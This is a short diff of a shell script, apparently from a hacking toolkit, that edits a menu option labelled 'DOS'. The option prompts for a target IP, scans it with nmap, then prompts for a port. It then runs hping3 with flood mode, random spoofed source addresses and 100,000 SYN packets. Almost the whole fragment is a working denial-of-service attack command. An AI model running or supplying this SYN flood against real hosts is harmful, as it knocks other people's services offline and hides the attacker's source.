@@ -254,11 +254,18 @@ echo
 echo
 echo -e  '\e[1;31m '
 read -p 'ip : ' ipdos
-echo -------------
-echo port ex: 53
-echo -------------
+nmap -sS -sV -Pn $ipdos
+echo
+echo
+echo
+echo ---------------
+echo   port ex: 53
+echo ---------------
+echo
+echo
+echo
 read -p ' port : ' portdos
-xterm -title DOS -e hping3 -c 100000 -d 120 -S -w 64 -p $portdos --flood --rand-source $ipdos
+xterm -title DOS -e hping3 -c 100000 -d 110 -S -w 64 -p $portdos --flood --rand-source $ipdos
 fi
 
 
